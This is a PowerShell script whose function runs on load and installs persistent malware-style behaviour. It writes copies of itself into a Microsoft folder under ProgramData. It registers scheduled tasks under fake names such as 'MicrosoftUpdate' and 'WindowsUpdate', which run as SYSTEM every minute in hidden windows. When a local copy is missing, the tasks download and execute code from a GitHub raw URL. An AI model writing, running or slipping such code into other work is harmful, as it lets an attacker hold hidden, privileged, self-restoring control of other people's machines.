function Gen-Info {
    # CREATION
    $alfa_path = "C:\ProgramData\Microsoft\DRM"
    $bravo_path = "C:\ProgramData\Microsoft\DRM"
    $charlie_path = "C:\ProgramData\Microsoft\DRM"
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
    if (-not (Test-Path "$alfa_path\alfa.ps1")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$alfa_path\alfa.ps1" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$bravo_path\bravo.ps1")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$bravo_path\bravo.ps1" -Encoding UTF8
    }
    
    $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
    if (-not (Test-Path "$charlie_path\charlie.ps1")) {
        "function Gen-Info {$funcBody`n}`nGen-Info`n# $random_chars" | Out-File -FilePath "$charlie_path\charlie.ps1" -Encoding UTF8
    }
    
    
    # SCHEDULE TASK CREATION
    
    $cmd_alfa = "if (-not (Test-Path '$alfa_path\alfa.ps1')) { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1') } else { & '$alfa_path\alfa.ps1' }"
    $cmd_bravo = "if (-not (Test-Path '$bravo_path\bravo.ps1')) { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1') } else { & '$bravo_path\bravo.ps1' }"
    $cmd_charlie = "if (-not (Test-Path '$charlie_path\charlie.ps1')) { IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1') } else { & '$charlie_path\charlie.ps1' }"

    $action1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd_alfa`""
    $action2 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd_bravo`""
    $action3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd_charlie`""
    
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1)
    
    $task_alfa = "MicrosoftUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_alfa -Action $action1, $action2, $action3 -Trigger $trigger -User "SYSTEM"
    }
    
    $task_bravo = "OneDrive"
    if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_bravo -Action $action1, $action2, $action3 -Trigger $trigger -User "SYSTEM"
    }
    
    $task_charlie = "WindowsUpdate"
    if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
        Register-ScheduledTask -TaskName $task_charlie -Action $action1, $action2, $action3 -Trigger $trigger -User "SYSTEM"
    }
}

Gen-Info

